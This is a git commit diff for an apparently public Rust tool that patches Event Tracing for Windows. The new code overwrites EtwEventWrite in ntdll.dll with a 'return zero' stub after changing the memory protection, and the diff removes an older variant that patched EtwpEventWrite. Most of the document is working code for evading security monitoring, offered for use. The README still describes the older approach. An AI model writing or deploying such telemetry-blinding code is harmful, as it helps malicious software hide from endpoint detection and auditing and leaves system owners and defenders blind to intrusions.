98e47433f9a8e337220a034ea9290cf892aabd6e
joaoviictorti <joaovictorti08@gmail.com>
2025-04-25 19:34:57 -0300

    Improving the search for the etw patch

--- ETW/README.md
+++ ETW/README.md
@@ -1,23 +1,12 @@
-# Patch ETW 🦀
+# ETW 🦀
 
-<p align="left">
-	<a href="https://www.rust-lang.org/"><img src="https://img.shields.io/badge/made%20with-Rust-red"></a>
-	<a href="#"><img src="https://img.shields.io/badge/platform-windows-blueviolet"></a>
-</p>
-
-- [Overview](#overview)
-- [Usage](#usage)
-
-# Overview
+## Overview
 
 The ETW patching technique is used to hide trace information from a running binary. This approach is distinguished by the existence of several functions responsible for writing traces, such as EtwEventWrite, EtwEventWriteFull and EtwEventWriteEx. The common element between these functions is the invocation of the EtwpEventWrite function, which shares the same memory address.  So the rust code will identify this address and subsequently apply a patch in a unified way.
 
-# Usage 
+## Usage 
 
 You can run with cargo run or the compiled binary directly:
 ```sh
-cargo run
-```
-```sh
-target/release/patch_etw.exe
+cargo run --release
 ```
--- ETW/src/main.rs
+++ ETW/src/main.rs
@@ -1,73 +1,33 @@
-use std::ffi::{c_void, CString};
-use windows::core::{s, PCSTR};
+use windows::core::{s, Error, Result, PCSTR};
 use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 use windows::Win32::System::Memory::{
-    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
+    VirtualProtect, PAGE_EXECUTE_READWRITE, 
+    PAGE_PROTECTION_FLAGS,
 };
 
-fn main() {
-    let event_write: *const u8 = CString::new("EtwEventWrite").unwrap().into_raw() as _;
-    patch_etw(event_write);
-}
-
-fn patch_etw(function: *const u8) {
+fn main() -> Result<()> {
+    let name = c"EtwEventWrite";
     unsafe {
-        let hook: [u8; 3] = [0x33, 0xC0, 0xC3];
-        let h_module = GetModuleHandleA(s!("ntdll.dll")).expect("[!] GetModuleHandleA Failed");
-        let address = GetProcAddress(h_module, PCSTR(function)).expect("[!] GetProcAddress Failed");
-        let address_ptr = address as *mut c_void;
-        let mut count = 0;
-        loop {
-            let opcode_c3 = *(address_ptr as *const u8).add(count);
-            let opcode_cc = *(address_ptr as *const u8).add(count + 1);
-            if opcode_c3 == 0xC3 && opcode_cc == 0xCC {
-                break;
-            }
-            count += 1;
-        }
+        // The patch to be written (xor eax, eax; ret)
+        let hook = [0x33, 0xC0, 0xC3];
 
-        loop {
-            let opcode_c3 = *(address_ptr as *const u8).add(count);
-            if opcode_c3 == 0xE8 {
-                let relative_offset_ptr = address_ptr.add(count + 1) as *const u8;
+        // Get a handle to ntdll.dll
+        let h_module = GetModuleHandleA(s!("ntdll.dll"))?;
 
-                // Calculates the absolute address of the call destination
-                // `count + 5` because the offset is relative to the next address of the instruction,
-                // which is the current address + size of the call opcode (1 byte) + size of the offset (4 bytes)
-                // Patch EtwpEventWrite
-                let call_destination_address = address as isize + count as isize + 5 + *relative_offset_ptr as isize;
+        // Get the address of the target function
+        let address = GetProcAddress(h_module, PCSTR(name.as_ptr().cast()))
+            .ok_or_else(|| Error::from_win32())? as *const u8;
 
-                println!("Call destination address: 0x{:X}", call_destination_address);
-                let mut old_protection = PAGE_PROTECTION_FLAGS(0);
-                VirtualProtect(
-                    call_destination_address as *mut c_void,
-                    hook.len(),
-                    PAGE_EXECUTE_READWRITE,
-                    &mut old_protection,
-                ).unwrap_or_else(|e| {
-                    panic!("[!] VirtualProtect Failed With Error: {e}");
-                });
+        // Change memory protection to allow writing
+        let mut old_protection = PAGE_PROTECTION_FLAGS(0);
+        VirtualProtect(address.cast(), hook.len(), PAGE_EXECUTE_READWRITE, &mut old_protection)?;
 
-                std::ptr::copy_nonoverlapping(
-                    hook.as_ptr(),
-                    call_destination_address as _,
-                    hook.len(),
-                );
+        // Write the patch opcode
+        std::ptr::copy_nonoverlapping(hook.as_ptr(), address.cast_mut(), hook.len());
 
-                VirtualProtect(
-                    call_destination_address as *mut c_void,
-                    hook.len(),
-                    old_protection,
-                    &mut old_protection,
-                ).unwrap_or_else(|e| {
-                    panic!("[!] VirtualProtect Failed With Error: {e}");
-                });
-
-                println!("[+] Patch ETW Finish!");
-
-                break;
-            }
-            count -= 1;
-        }
+        // Restore the original memory protection
+        VirtualProtect(address.cast(), hook.len(), old_protection, &mut old_protection)?;
     }
+
+    Ok(())
 }
